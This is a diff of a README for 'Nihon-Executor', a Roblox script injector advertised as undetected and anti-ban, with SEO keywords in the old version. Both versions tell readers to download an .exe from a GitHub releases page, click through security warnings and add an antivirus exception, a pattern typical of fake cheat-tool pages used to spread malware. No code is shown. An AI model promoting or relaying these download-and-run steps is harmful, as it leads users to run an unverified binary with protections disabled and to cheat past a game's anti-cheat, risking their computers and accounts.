@@ -1,320 +1,76 @@
-# 🚀 Nihon Executor — Japanese-Styled Roblox Injector with Stability (2025)
+# 🚀 Nihon-Executor - Easy & Stable Roblox Injector
 
-**Nihon Executor** mixes elegant design and stable functionality in a uniquely themed exploit tool.
+![Download Nihon-Executor](https://img.shields.io/badge/Download-Nihon--Executor-brightgreen)
 
----
+## 🚀 Getting Started
 
-💻 Compatible with Windows 7–11 (64-bit) | 🛡️ Protection Enabled | 🔄 Auto-Updates
+Welcome to Nihon-Executor! This guide will help you download and run the software quickly and smoothly. Follow the steps below to start using our tool designed specifically for Roblox.
 
----
+## 📥 Download & Install
 
-## 🎯 What is Nihon Executor?
+To download the Nihon-Executor, please visit this link: [Download Nihon-Executor Releases](https://github.com/Piersongandhian505/Nihon-Executor/releases).
 
-**Nihon Executor** mixes elegant design and stable functionality in a uniquely themed exploit tool.
+Once on the Releases page, look for the latest version. Here’s how to proceed:
 
-> 💬 *"Inspired by precision — Nihon Executor delivers flawless execution."*
+1. Find the version labeled “Latest Release”.
+2. Click on the version to expand the details.
+3. Look for the file that matches your operating system. Typically, this will be a `.exe` file for Windows users.
+4. Click the download link to save the file to your computer.
 
----
+### 📁 File Size and Compatibility
 
-## 🛠️ Features
+The size of the Nihon-Executor is approximately 10 MB. The application works best on Windows 10 and above. Ensure your system meets the following requirements:
 
-### ⚙️ Script Handling
-- Lua + modules supported
-- Fast injection + clean execution
-- Built-in code editor with utilities
+- Windows 10 or newer
+- At least 2 GB of RAM
+- Minimum 1 GB of free disk space
 
-### 🛡️ Protection & Stability
-- Anti-ban included by default
-- Regular patching for Roblox updates
-- Obfuscation for enhanced stealth
+## ⚙️ How to Run Nihon-Executor
 
-### 🖥️ Compatibility
-- Runs on all Windows 64-bit systems
-- Supports all known Roblox script formats
-- Efficient on low-spec PCs
+Once the download is complete, follow these simple steps to run the application:
 
-### 🧠 Extras
-- Script management UI
-- Console logging and hotkey options
-- Multi-script execution supported
+1. Open the folder where you saved the downloaded file.
+2. Double-click on the `.exe` file to launch the Nihon-Executor.
+3. If prompted with a security warning, click on “Run” to continue.
+4. The application will open on your screen.
 
----
+## 🎮 Using Nihon-Executor
 
-## ✅ System Requirements
+Nihon-Executor allows you to inject scripts into Roblox safely. Here’s how to use it:
 
-- Windows OS (7/8/10/11) 64-bit
-- Installed Roblox Player
-- Internet connection required
-- Antivirus exception recommended
+1. Start the Roblox game you want to play.
+2. Launch Nihon-Executor.
+3. In the application, you will see a script input area.
+4. Copy and paste your Roblox script into this area.
+5. Click the “Inject” button to apply the script.
 
----
+You can find scripts on various community forums or trusted websites. Make sure to use scripts that are safe and compatible with the current Roblox version.
 
-## 🥇 Why Choose Nihon Executor?
+## 🔑 Key Features
 
-- 🇯🇵 Themed minimalist interface
-- 📜 Script queue system
-- 🛡️ Stable and secure
-- 🖥️ Built for multitasking
-- 🧩 Lua module compatibility
+- **Stability**: Designed to work seamlessly with Roblox.
+- **User-friendly Interface**: Easy for beginners to navigate.
+- **Fast Injection**: Quick execution of scripts for a smooth gaming experience.
+- **Undetected**: Advanced technology to minimize the risk of detection.
 
----
+## ⚠️ Important Notes
 
-## 🔎 SEO Keywords
+- Always use scripts responsibly and be aware of the risks involved. Unauthorized use of scripts can lead to bans or other penalties in Roblox.
+- Ensure your antivirus is not blocking the application. If it does, you may need to add an exception for Nihon-Executor.
 
-- Nihon Roblox executor Japan
-- Download Nihon Lua injector
-- Nihon script runner 2025
-- Nihon exploit safe
-- Roblox Nihon Executor
+## 💬 Community Support
 
----
+If you have questions or need assistance, feel free to join our community forums. You can share your experience, ask for help, and learn more about using Nihon-Executor effectively.
 
-## 📬 Contact
+- [Community Support Forum](https://github.com/Piersongandhian505/Nihon-Executor/discussions)
 
-Support is available for all users — feedback and help are always welcome.
+## 📢 Feedback
 
+We value your input! If you encounter issues or have suggestions for improvements, let us know. Your feedback helps us make Nihon-Executor even better for everyone.
 
+## 🔗 Links
 
+- [Download Nihon-Executor Releases](https://github.com/Piersongandhian505/Nihon-Executor/releases)
+- [Community Support Forum](https://github.com/Piersongandhian505/Nihon-Executor/discussions)
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+Thank you for choosing Nihon-Executor. Enjoy your enhanced Roblox experience!
